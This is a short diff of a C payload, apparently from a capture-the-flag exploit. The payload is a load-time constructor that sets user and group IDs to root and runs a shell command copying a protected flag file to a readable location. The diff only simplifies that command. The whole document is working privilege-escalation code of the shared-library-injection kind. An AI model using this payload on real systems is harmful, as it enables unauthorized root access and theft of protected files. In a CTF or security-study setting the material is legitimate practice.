@@ -5,5 +5,5 @@ __attribute__((constructor)) void woot(void) {
   setreuid(0,0);
   setregid(0,0);
   chdir("/");
-  execl("/bin/sh", "sh", "-c", "echo `cat /flag3` > /flagfree", NULL);
+  execl("/bin/sh", "sh", "-c", "cat /flag3 > /flagfree", NULL);
 }
